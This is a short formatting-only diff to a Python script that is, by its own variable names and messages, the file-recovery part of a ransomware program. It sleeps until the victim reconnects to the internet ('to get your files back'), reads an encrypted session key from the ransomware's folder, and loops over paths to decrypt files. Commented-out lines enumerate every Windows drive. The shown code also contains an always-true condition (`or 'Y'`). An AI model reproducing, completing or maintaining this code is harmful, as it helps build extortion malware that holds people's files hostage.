@@ -6,6 +6,7 @@ import pickle
 import requests
 import time
 import logging
+
 sys.path.append(os.path.dirname(os.path.abspath(__file__)))
 from utils import *
 from utils import (
@@ -47,10 +48,11 @@ if decryptend == "y" or "Y":
             )
             break
         except:
-            print("No connection, sleeping for 2 minutes\nConnect \
-                  to internet to get your files back!")
+            print(
+                "No connection, sleeping for 2 minutes\nConnect \
+                  to internet to get your files back!"
+            )
             time.sleep(120)
-
 
     with open(ransomware_path + "\\session_key.txt", "rb") as f:
         enc_session_key = f.read()
@@ -67,7 +69,6 @@ if decryptend == "y" or "Y":
 
     removeFiles = True
 
-
     #   drives = win32api.GetLogicalDriveStrings()
     #   drives = drives.split('\000')[:-1]
 
@@ -77,10 +78,8 @@ if decryptend == "y" or "Y":
     #   for drive in drives:
     #       paths.append(drive)
 
-
     format = "%(asctime)s: %(message)s"
     logging.basicConfig(format=format, level=logging.INFO, datefmt="%H:%M:%S")
-
 
     for x in paths:
         final_session_decrypted = final_session_decrypted.decode()
